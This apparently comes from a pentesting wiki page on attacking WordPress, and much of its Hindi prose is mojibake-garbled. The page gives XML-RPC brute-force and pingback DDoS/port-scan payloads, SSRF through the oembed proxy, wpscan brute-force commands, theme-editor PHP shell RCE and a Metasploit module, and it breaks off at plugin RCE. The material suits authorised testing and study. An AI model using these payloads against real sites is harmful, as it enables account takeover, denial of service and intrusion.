# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк theme рдХреЗ рдХрд┐рд╕реА php рдХреЛ рдмрджрд▓рдХрд░ RCE рд╣рд╛рд╕рд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЙрд╕реА path рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: Using **theme twentytwelve** рдЖрдк **404.php** рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЗрд╕ рдкрд╛рде рдкрд░ **access** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** рдЖрдк database рдХрд╛ root password рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ WordPress рдХрд╛ versionред
- `wp-activate.php` рдирдпрд╛ WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп email activation рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдЙрд╕ рдлрд╝реАрдЪрд░ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИ рдЬреЛ HTTP рдХреЛ transport mechanism рдФрд░ XML рдХреЛ encoding mechanism рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрдЪрд╛рд░ рд╡рд┐рдзрд┐ рдХреЛ WordPress рдХреЗ [REST API](https://developer.wordpress.org/rest-api/reference) рдиреЗ рдмрджрд▓ рджрд┐рдпрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рдореБрдЦреНрдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ plugins рдФрд░ themes рд╕реНрдЯреЛрд░ рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИрдВред
- `wp-includes/` рдпрд╣ рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ core рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдЯреЛрд░ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ certificates, fonts, JavaScript files, рдФрд░ widgetsред
- `wp-sitemap.xml` WordPress versions 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдКрдкрд░ рдореЗрдВ, Worpress рдПрдХ sitemap XML рдлрд╝рд╛рдЗрд▓ рдЬрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рднреА public posts рдФрд░ publicly queryable post types рдФрд░ taxonomies рд╣реЛрддреЗ рд╣реИрдВред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ WordPress рдХреЛ database рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ database name, database host, username рдФрд░ password, authentication keys рдФрд░ salts, рдФрд░ database table prefixред рдпрд╣ configuration рдлрд╝рд╛рдЗрд▓ DEBUG mode рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬреЛ troubleshooting рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Users Permissions

- **Administrator**
- **Editor**: рдЕрдкрдиреЗ рдФрд░ рджреВрд╕рд░реЛрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Author**: рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Contributor**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рд▓рд┐рдЦрддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдкрд░ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдиреА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ

## **Passive Enumeration**

### **Get WordPress version**

рдЪреЗрдХ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдлрд╝рд╛рдЗрд▓реЗрдВ `/license.txt` рдпрд╛ `/readme.html` рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ

рдкреГрд╖реНрда рдХреЗ **source code** рдХреЗ рдЕрдВрджрд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## рд╕рдХреНрд░рд┐рдп рдЕрдиреНрд╡реЗрд╖рдг

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдореНрд╕

рдЖрдк рд╕рдВрднрд╡рддрдГ рд╕рднреА рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдореНрд╕ рдирд╣реАрдВ рдвреВрдБрдв рдкрд╛рдПрдБрдЧреЗред рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ Brute Force рдХрд░рдХреЗ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдореНрд╕ рдХреА рд╕реВрдЪреА рдирд┐рдХрд╛рд▓рдиреА рд╣реЛрдЧреА** (рд╣рдореЗрдВ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдРрд╕реА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд tools рдореМрдЬреВрдж рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпреЗ рд╕реВрдЪрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ)ред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

- **ID Brute:** рдЖрдк WordPress рд╕рд╛рдЗрдЯ рд╕реЗ Brute Forcing users IDs рдХреЗ рдЬрд░рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **200** рдпрд╛ **30X** рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ id **рдорд╛рдиреНрдп** рд╣реИред рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **400** рд╣реИ, рддреЛ id **рдЕрдорд╛рдиреНрдп** рд╣реИред

- **wp-json:** рдЖрдк users рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП query рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдЕрдиреНрдп `/wp-json/` endpoint рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдпрд╣ рдлреАрдЪрд░ рд╕рдХреНрд╖рдо рд╣реИ**ред

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: рдЬрдм **`/wp-login.php`** рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╕рдордп **рд╕рдВрджреЗрд╢** рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ **username рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк credentials brute-force рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕реЗ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ DoS attacks рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ рдпрд╛ рдирд╣реАрдВ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП _**/xmlrpc.php**_ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдпрд╣ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ:

**рдЬрд╛рдВрдЪреЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдХреБрдЫ рдРрд╕реЗ рдореЗрдердбреНрд╕ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ credentials рдХреЛ brute-force рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдвреВрдВрдврд╝ рдкрд╛рдПрдБ рддреЛ рдЖрдк рдХреБрдЫ рдРрд╕рд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
The message _"Incorrect username or password"_ inside a 200 code response should appear if the credentials aren't valid.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рдпрджрд┐ credentials рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ рддреЛ 200 рдХреЛрдб response рдХреЗ рднреАрддрд░ рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╕рд╣реА credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред response рдореЗрдВ path рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, `system.multicall` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ brute-force credentials рдХреЗ рд▓рд┐рдП рдПрдХ **рддреЗрдЬрд╝ рддрд░реАрдХрд╛** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдПрдХ рд╣реА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдореЗрдВ рдХрдИ credentials рдЖрдЬрд╝рдорд╛ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

рдпрд╣ рд╡рд┐рдзрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдХреЗ рд▓рд┐рдП рд╣реИ, рдЗрдВрд╕рд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рдФрд░ рдкреБрд░рд╛рдиреА рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдпрд╣ 2FA рдХреЛ рд╕рдкреЛрд░реНрдЯ рдирд╣реАрдВ рдХрд░рддреАред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ valid creds рд╣реИрдВ рд▓реЗрдХрд┐рди рдореБрдЦреНрдп рдкреНрд░рд╡реЗрд╢ 2FA рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ **рдЖрдк xmlrpc.php рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди creds рд╕реЗ 2FA рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЖрдк console рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд░ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА actions рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА рдЖрдк RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ Ippsec рдиреЗ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рд╣реИред

**DDoS or port scanning**

рдпрджрд┐ рдЖрдк list рдХреЗ рдЕрдВрджрд░ _**pingback.ping**_ method рдХреЛ рдвреВрдБрдв рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк Wordpress рдХреЛ рдХрд┐рд╕реА рднреА host/port рдкрд░ arbitrary request рднреЗрдЬрд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╣рдЬрд╝рд╛рд░реЛрдВ** Wordpress **рд╕рд╛рдЗрдЯреЛрдВ** рд╕реЗ рдПрдХ рд╣реА **рд╕реНрдерд╛рди** рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░рд╡рд╛рдПрдБрдЧреЗ (рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ **DDoS** рд╣реЛрддрд╛ рд╣реИ), рдпрд╛ рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **Wordpress** рдХреЛ рдХрд┐рд╕реА internal **рдиреЗрдЯрд╡рд░реНрдХ** рдкрд░ **рд╕реНрдХреИрди** рдХрд░рд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк рдХреЛрдИ рднреА рдкреЛрд░реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдХрд╛ рдорд╛рди **рдмрдбрд╝рд╛** **0** (17) рд╕реЗ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ port рдЦреБрд▓рд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рд╕реАрдЦ рд╕рдХреЗрдВ рдХрд┐ рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ DDoS рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЖрдорддреМрд░ рдкрд░ Wordpress рд╕рд╛рдЗрдЯ рдХреА рд░реВрдЯ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИ: **`/wp-cron.php`**\\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ "**рднрд╛рд░реА**" MySQL **query** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╣рдорд▓рд╛рд╡рд░** рджреНрд╡рд╛рд░рд╛ **DoS** **рдкреИрджрд╛** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `wp-cron.php` рдХреЛ рд╣рд░ рдкреЗрдЬ рд▓реЛрдб рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рднреА рдХреЛрдИ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд┐рд╕реА рднреА Wordpress рдкреЗрдЬ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ), рдЬреЛ high-traffic рд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ (DoS) рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ Wp-Cron рдХреЛ disable рдХрд░реЗрдВ рдФрд░ host рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ cronjob рдмрдирд╛рдПрдВ рдЬреЛ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗ (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд┐рдП)ред

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ рдЯреВрд▓ рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ рдХрд┐ **methodName: pingback.ping** рдореМрдЬреВрдж рд╣реИ рдФрд░ рдкрд╛рде **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдФрд░ рдЕрдЧрд░ рдореМрдЬреВрдж рд╣реИрдВ рддреЛ рдпрд╣ рдЙрдиреНрд╣реЗрдВ exploit рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## рдПрдХ рдмрд┐рдЯ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрд╣ рдЕрд╕рд▓ рд╣рдорд▓рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рдХрд╛ 1 рдмрд┐рдЯ рдкрд▓рдЯ рд╕рдХрддреЗ рдереЗред рдЗрд╕рд▓рд┐рдП рдЖрдк рдлрд╝рд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреА рд╕реНрдерд┐рддрд┐ `5389` рдкрд░ рдмрд┐рдЯ рдкрд▓рдЯрдХрд░ NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЛ NOP рдХрд░ рд╕рдХрддреЗ рдереЗред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**рдереАрдо рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП php рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (admin credentials рдЖрд╡рд╢реНрдпрдХ)**

Appearance тЖТ Theme Editor тЖТ 404 Template (at the right)

php shell рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдмрджрд▓реЗрдВ:

![](<../../images/image (384).png>)

рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣рд╛рдБ рдкрд╣реБрдБрдЪрдирд╛ рд╣реЛрдЧрд╛: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

## Plugin RCE

### PHP plugin

рдХрднреА-рдХрднреА .php рдлрд╛рдЗрд▓реЗрдВ plugin рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред  
